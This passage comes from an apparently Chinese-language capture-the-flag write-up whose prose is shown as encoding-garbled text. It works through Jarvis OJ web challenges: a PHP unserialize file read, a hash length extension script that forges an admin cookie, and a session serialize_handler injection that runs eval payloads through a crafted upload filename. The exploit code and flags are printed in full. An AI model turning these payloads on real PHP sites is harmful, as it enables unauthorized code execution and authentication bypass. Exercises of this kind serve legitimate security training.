unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ° <code>shield.php</code> çš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//flag is in pctf.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>shield.php</code> ä¸­è¯´flagåœ¨ <code>pctf.php</code> é‡Œï¼Œä½†æ˜¯åœ¨ <code>showing.php</code> ä¸­è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç›´æ¥è¯»å®ƒæ‹¿åˆ°çš„æ˜¯å‡flagã€‚ç•™æ„åˆ° <code>index.php</code> é‡Œç”¨äº†ååºåˆ—åŒ–ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹æ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Shield();</span><br><span class="line">    $a-&gt;file = <span class="string">"pctf.php"</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–åçš„ç»“æœä¸ºï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>index.php</code> ä¸­çš„ <code>class</code> å‚æ•°ä¼ å…¥payloadç„¶åå†ååºåˆ—åŒ–å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32768</span>/?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?php </span></span><br><span class="line"><span class="comment">    //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span></span><br><span class="line"><span class="comment">    //Fake flag:</span></span><br><span class="line"><span class="comment">    echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"><a href="#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ" class="headerlink" title="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"></a>flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h3><p>åªæœ‰ç®¡ç†å‘˜æ‰èƒ½è·å¾—flagï¼Œä½ èƒ½æƒ³åŠæ³•è·å¾—å—ï¼Ÿ</p><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>vimå¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼ˆ <code>/index.php~</code> ï¼‰ï¼Œæ¢å¤åæ‹¿åˆ°æºç ï¼ˆé¢˜ç›®æœ‰ç‚¹é—®é¢˜ï¼Œ<code>vim -r</code> ä¸€ç›´å¤±è´¥ï¼Œæƒ³å¼ºè¡Œæ‰‹åŠ¨æ¢å¤ä½†æ˜¯æ„Ÿè§‰æ²¡å•¥æ„ä¹‰â€¦å°±ç›´æ¥æœäº†åŸé¢˜çš„æºç è´´ä¸Šæ¥äº†ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">        &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">            body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;  </span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt; </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">            $role = <span class="string">"guest"</span>;   </span><br><span class="line">            $salt = ;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">                $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">                $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </span><br><span class="line">                    $auth = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    $auth = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;&#125;   </span><br><span class="line">                $s = serialize($role);</span><br><span class="line">                setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">                $hsh = md5($salt.strrev($s));</span><br><span class="line">                setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span>  </span><br><span class="line">    &lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒè¯­å¥ä¸ºï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">role===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))</span></span><br></pre></td></tr></table></figure></p><p>æŸ¥äº†äº›èµ„æ–™ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ <code>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</code> ã€‚</p><p>åšé¢˜çš„æ—¶å€™æ•´ç†äº†ä¸€ä¸‹è¿™é‡Œæ¶‰åŠçš„çŸ¥è¯†ç‚¹ - <a href="http://blog.cyris.cn/2018/02/02/hash-extender-attack/" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p>åˆ©ç”¨å·¥å…·ï¼š</p><blockquote><p><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a><br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">hash_extender</a></p></blockquote><p>å·²æœ‰æ¡ä»¶ï¼š<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie-hshï¼š<span class="number">3</span>a<span class="number">4727</span>d<span class="number">57463</span>f<span class="number">122833</span>d<span class="number">9</span>e<span class="number">732</span>f<span class="number">94</span>e<span class="number">4</span>e<span class="number">0</span></span><br><span class="line">Cookie-roleï¼šs<span class="meta">%</span><span class="number">3</span>A<span class="number">5</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">22</span>guest<span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">3</span>B</span><br><span class="line">éœ€è¦æ±‚ï¼šmd<span class="number">5</span><span class="comment">(salt+strrev(admin)</span>)</span><br><span class="line">* salté•¿åº¦æœªçŸ¥</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ hash_extender ï¼ˆéœ€è¦makeä¸€ä¸‹ï¼‰ï¼Œå› ä¸º mac æœ€æ–°çš„ openssl åº“å°±æ˜¯è£…ä¸ä¸Šâ€¦.ä¸¢å»æœåŠ¡å™¨ä¸Šè·‘äº†ï¼Œsalt é•¿åº¦æœªçŸ¥ï¼Œè´´ä¸€ä»½è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="comment">#print x</span></span><br><span class="line">        <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</span><br><span class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="keyword">print</span> ret</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›æ˜¾ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">12</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">background</span><span class="selector-pseudo">:gray</span>;</span></span><br><span class="line"><span class="css"><span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¹Ÿå¯ä»¥çŸ¥é“ salt çš„é•¿åº¦ä¸º12ã€‚</p><hr><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p>é¢˜ç›®å…¥å£ï¼š<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><p>ä¸Šæ¥å°±ç»™å‡ºäº†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>); <span class="comment">//è®¾ç½®æŒ‡å®šé…ç½®é€‰é¡¹çš„å€¼ã€‚è¿™ä¸ªé€‰é¡¹ä¼šåœ¨è„šæœ¬è¿è¡Œæ—¶ä¿æŒæ–°çš„å€¼ï¼Œå¹¶åœ¨è„šæœ¬ç»“æŸæ—¶æ¢å¤ã€‚</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ° session.serialize_handler ï¼Œå…ˆæ”¾ä¸€ç¯‡å…³äº PHP ååºåˆ—åŒ–çš„<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">æ–‡ç« </a>ã€‚</p><p>PHP å†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºåœ¨å­˜å– $_SESSION æ•°æ®æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><table><thead><tr><th style="text-align:left">å¤„ç†å™¨</th><th style="text-align:left">å­˜å‚¨æ ¼å¼</th></tr></thead><tbody><tr><td style="text-align:left">php</td><td style="text-align:left">é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—åŒ–çš„å€¼</td></tr><tr><td style="text-align:left">php_binary</td><td style="text-align:left">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—åŒ–çš„å€¼</td></tr><tr><td style="text-align:left">php_serialize (php&gt;=5.5.4)</td><td style="text-align:left">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—åŒ–çš„æ•°ç»„</td></tr></tbody></table><p>æ¼æ´äº§ç”Ÿåœ¨ php_serialize å’Œ php çš„è§£ææ–¹å¼ä¸Šã€‚å¦‚æœæˆ‘ä»¬ç”¨ php_serialize çš„æ–¹å¼æ„é€ åºåˆ—åŒ–è¯­å¥ï¼Œç„¶åé€šè¿‡ php è§£æè¯­å¥ï¼Œä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå› ä¸ºåœ¨ä½¿ç”¨ php_serialize æ„é€ è¯­å¥æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ â€˜|â€™ è¿™ä¸ªç¬¦å·ï¼Œä½†æ˜¯åœ¨ php è¿›è¡Œè§£ææ—¶ä¼šå°† â€˜|â€™ ç¬¦å·å‰çš„æ•°æ®å½“ä½œæ•°ç»„ä¸­çš„é”®ï¼Œå…¶åçš„æ•°æ®å½“ä½œå€¼ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„è¯­å¥æ¥è¿›è¡Œåˆ©ç”¨äº†ã€‚</p><p>é€šè¿‡ phpinfo é¡µé¢å¯ä»¥è·å¾—çš„ä¿¡æ¯æœ‰ï¼š</p><ol><li>php ç‰ˆæœ¬ä¸º 5.6.21 ã€‚</li><li>php.ini ä¸­é»˜è®¤çš„ session.serialize_handler ä¸º php_serialize ï¼Œè€Œ index.php ä¸­ç¡®å°†å®ƒè®¾ç½®æˆäº† php ï¼ˆè¿™å°±å¯¼è‡´äº† session ååºåˆ—åŒ–çš„é—®é¢˜ï¼‰ã€‚</li><li>session.upload_progress.enabled çš„çŠ¶æ€ä¸º On ã€‚</li><li>session.upload_progress.cleanup ä¸ºå…³é—­çŠ¶æ€ï¼ˆæé«˜äº†æ¼æ´åˆ©ç”¨æˆåŠŸç‡ï¼‰ã€‚</li></ol><p>è¦å°†æ•°æ®æ³¨å…¥åˆ° session ä¸­ï¼Œä¸€ç§æƒ…å†µæ˜¯å¼€å‘è€…æœ¬èº«å°†ç”¨æˆ·å¯æ§çš„æ•°æ®ä¼ è¿›äº† session ï¼ˆæ¯”å¦‚ joomla ç­‰ï¼‰ï¼›å¦ä¸€æ–¹é¢åˆ™å¯é€šè¿‡ php é…ç½®ä¸å½“è¿›è¡Œ session æ§åˆ¶ï¼Œæ¯”å¦‚ session.upload_progress.enabled is onã€‚å½“è¿™ä¸ªè®¾ç½®æ‰“å¼€æ—¶ï¼Œphp ä¼šè®°å½•ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ï¼Œåœ¨ä¸Šä¼ æ—¶ä¼šå°†å…¶ä¿¡æ¯ä¿å­˜åœ¨ $_SESSION ä¸­ã€‚</p><p>ä¸‹é¢å¼€å§‹æ¼æ´åˆ©ç”¨ã€‚</p><p>é¦–å…ˆå†™ä¸€ä¸ªæäº¤è¡¨å•å¤‡ç”¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"gogogo"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸çŸ¥é“ flag è—åœ¨å“ªé‡Œï¼Œå…ˆè¯•ç€è·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ã€‚æ„é€  payload ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–ç»“æœä¸ºï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"OowoO"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mdzz"</span>;<span class="attribute">s</span>:<span class="number">36</span>:<span class="string">"print_r(scandir(dirname(__FILE__)));"</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†é˜²æ­¢å¼•å·è¢«è½¬ä¹‰ï¼Œåœ¨å‰é¢åŠ ä¸ªæ ï¼Œå†æŠŠå®ƒæ”¹ä¸º session çš„æ ¼å¼ï¼Œå³åœ¨ payload å¼€å¤´ä½ç½®åŠ ä¸ª â€˜|â€™ ï¼Œä¿®æ”¹åçš„ payload å¦‚ä¸‹ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|<span class="attribute">O</span>:<span class="number">5</span>:\<span class="string">"OowoO\"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:\<span class="string">"mdzz\"</span>;<span class="attribute">s</span>:<span class="number">36</span>:\<span class="string">"print_r(scandir(dirname(__FILE__)));\"</span>;&#125;</span><br></pre></td></tr></table></figure><p>Burp start ï¼Œåˆ©ç”¨åˆšåˆšå†™çš„æäº¤è¡¨å•éšä¾¿ä¼ ä¸ªä¸œè¥¿ä¸Šå»ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹ filename ä¸º payload ï¼ˆå¼€å¤´çš„ â€˜|â€™ åé¢å¦‚æœåŠ äº†ç©ºæ ¼ä¼šå¯¼è‡´ payload å¤±æ•ˆï¼Œå»æ‰å°±å¥½äº†ï¼‰ï¼š</p><p><img src="/posts/jarvisoj-wp/PHPINFO-1.png" alt=""></p><p>æ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œå»è¯»å– Here_1s_7he_fl4g_buT_You_Cannot_see.php 